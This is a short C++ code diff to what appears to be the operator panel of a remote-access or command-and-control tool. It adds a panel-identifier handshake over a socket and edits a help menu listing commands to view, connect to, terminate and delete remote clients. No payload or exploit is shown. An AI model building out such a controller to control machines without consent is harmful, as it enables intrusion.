@@ -1,5 +1,7 @@
 #include "panel.h"
 
+string panelId {"PanelId"};
+
 //
 void Panel()
 {
@@ -42,6 +44,8 @@ void Panel()
     }
 
     cout << "\n--- Connect To Server ---\n\n";
+
+    send(sock, panelId.c_str(), panelId.size() + 1, 0);
 
     // Do-while loop to send and receive data
     char buf[4096];
@@ -87,7 +91,7 @@ void registerCommands(string userInput, SOCKET sock)
         printf("------------------------------------------------------|\n");
         printf("(Connection Commands)                                 |\n");
         printf("                                                      |\n");
-        printf("[clients]       |  View Connected Clients             |\n");
+        printf("-clients        |  View Connected Clients             |\n");
         printf("[connect <id>]  |   Connect to Client                 |\n");
         printf("[close <id>]    |   Terminate Connection              |\n");
         printf("[delete <id>]   |   Kill Connection & Delete Program  |\n");
